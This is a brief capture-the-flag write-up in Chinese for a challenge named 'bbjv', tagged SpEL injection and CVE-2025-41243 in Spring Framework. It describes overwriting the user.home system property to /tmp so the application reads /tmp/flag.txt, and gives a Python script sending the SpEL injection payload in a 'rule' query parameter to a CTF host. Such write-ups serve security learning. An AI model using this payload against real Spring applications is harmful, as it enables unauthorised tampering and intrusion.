---
tags: [SpEL注入, RCE, Spring Framework, CVE-2025-41243]
---

# bbjv

https://rce.moe/2025/09/29/CVE-2025-41243

修改 systemProperties bean 中的 user.home 为 /tmp ，然后依照题目逻辑读取 /tmp/flag.txt

```
1   import re
2   import requests 3
4  url = 'https://eci-2ze848gtw123biqh78fh.cloudeci1.ichunqiu.com:8080/check'
5
6   params = {
7       'rule': "#{#systemProperties['user.home'] = '/tmp/'}"
8   }
9
10   print(requests.get(url, params=params).text)
```

